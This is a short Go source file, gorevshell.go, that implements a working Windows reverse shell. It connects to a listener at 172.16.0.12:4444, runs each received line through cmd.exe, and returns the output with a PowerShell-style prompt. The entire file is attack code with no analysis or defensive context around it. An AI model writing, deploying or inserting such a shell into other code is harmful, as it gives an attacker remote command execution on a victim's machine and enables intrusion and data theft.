// gorevshell.go
package main
import ("bufio"; "net"; "os/exec"; "strings")
func main() {
    conn, err := net.Dial("tcp", "172.16.0.12:4444")
    if err != nil { return }
    defer conn.Close()
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
        cmd := exec.Command("cmd.exe", "/c", strings.TrimSpace(scanner.Text()))
        out, _ := cmd.CombinedOutput()
        conn.Write(out)
        conn.Write([]byte("PS C:\\> "))
    }
}
